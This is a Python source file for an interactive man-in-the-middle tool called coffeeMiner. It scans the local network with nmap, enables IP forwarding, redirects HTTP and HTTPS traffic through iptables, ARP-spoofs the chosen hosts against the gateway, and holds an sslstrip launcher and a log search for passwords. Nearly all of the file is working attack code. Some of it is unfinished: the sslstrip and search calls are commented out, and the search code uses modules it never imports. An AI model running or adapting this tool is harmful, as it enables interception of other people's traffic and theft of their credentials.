import os
import sys
from subprocess import Popen, PIPE

class coffeeMiner(object):
    def __init__(self):
        pass

    def begin(self):
        print('Scanning network interfaces...\n')
        interfaces = self.get_interfaces()
        self.print_list(interfaces)
        interface = interfaces[int(input('\nSelect your interface:\t'))-1]
        print('Selected interfaces: %s\n' % interface)

        print('Scanning network...\n')
        networks = self.get_networks()
        self.print_list(networks)
        network = networks[int(input('\nSelect your network:\t'))-1]
        print('Selected network: %s\n' % network)

        print('Scanning selected network...')
        hosts = self.get_hosts(network)
        gateway = hosts[0]
        self.print_list(hosts)
        selected_hosts = self.select_hosts(hosts)

        print("Enabling IP packets forwarding...")
        self.enable_ipforward()
        
        print("Enabling HTTP traffic redirection...")
        self.traffic_redirection()

        print("")
        self.arpspoof(interface, selected_hosts, gateway)

        logfile = os.path.abspath(input("Enter log file path. Default: ./log.txt\t") or "log.txt")
        print(logfile)
        # self.start_sslstrip(logfile)
        while input("Search passwords? [y/n]\t").lower() == 'y':
            # self.search(logfile)
            print("going")
        self.clean()


    def get_networks(self):
        return self.execute_command('ip r | grep -v default | awk \'{print $1}\'')

    def get_hosts(self, network):
        return self.execute_command("nmap -sP %s | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'" % network)

    def select_hosts(self, hosts):
        hosts_number = input('Select hosts separeted with comma, "*" for all\t')
        hosts_number = hosts_number.split(',') if '*' not in hosts else '*'
        selected_hosts = []
        if hosts_number[0] != '*':
            for host in hosts_number:
                selected_hosts.append(hosts[int(host)-1])
        else:
            selected_hosts = hosts
        return selected_hosts

    def enable_ipforward(self):
        self.execute_command("echo 1 > /proc/sys/net/ipv4/ip_forward")

    def traffic_redirection(self):
        self.execute_command("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
        self.execute_command("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
        self.execute_command("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")

    def get_interfaces(self):
        return self.execute_command('ls /sys/class/net')

    def arpspoof(self, interface, selected_hosts, gateway):
        for host in selected_hosts:
            self.execute_command("arpspoof -i %s -t %s -r %s >> log2.txt 2>&1 &" % (interface, host, gateway))

    def start_sslstrip(self, logfile):
        self.execute_command("sslstrip -l 8080 -w %s >> /dev/null 2>&1 &" % logfile)

    def search(self, logfile):
        mod = os.stat(logfile).st_mtime
        regexp = "[0-9]+-[0-9]+-[0-9]*.*:.*\n*.*pass.*"
        while True:
            if os.stat(logfile).st_mtime != mod:
                res = '\n'.join(self.execute_command("strings %s" % logfile))
                res = re.findall(regexp, str(res))
                for i in res: 
                    print(unquote(i.replace('\n', ' ')))
                time.sleep(1)
                mod = os.stat(logfile).st_mtime

    def execute_command(self, command):
        process = Popen(command, shell=True, stdout=PIPE, stdin=PIPE).communicate()[0]
        res = process.decode("utf-8").splitlines()
        return res

    def print_list(self, arg_list):
        count = 0
        for item in arg_list:
            count = count + 1
            print('%s %s' %(count, item))

    def clean(self):
        self.execute_command("killall -9 arpspoof sslstrip >> /dev/null 2>&1 &")
        self.execute_command("iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
        self.execute_command("echo 0 > /proc/sys/net/ipv4/ip_forward")


if __name__ == '__main__':
    cm = coffeeMiner()
    cm.begin()
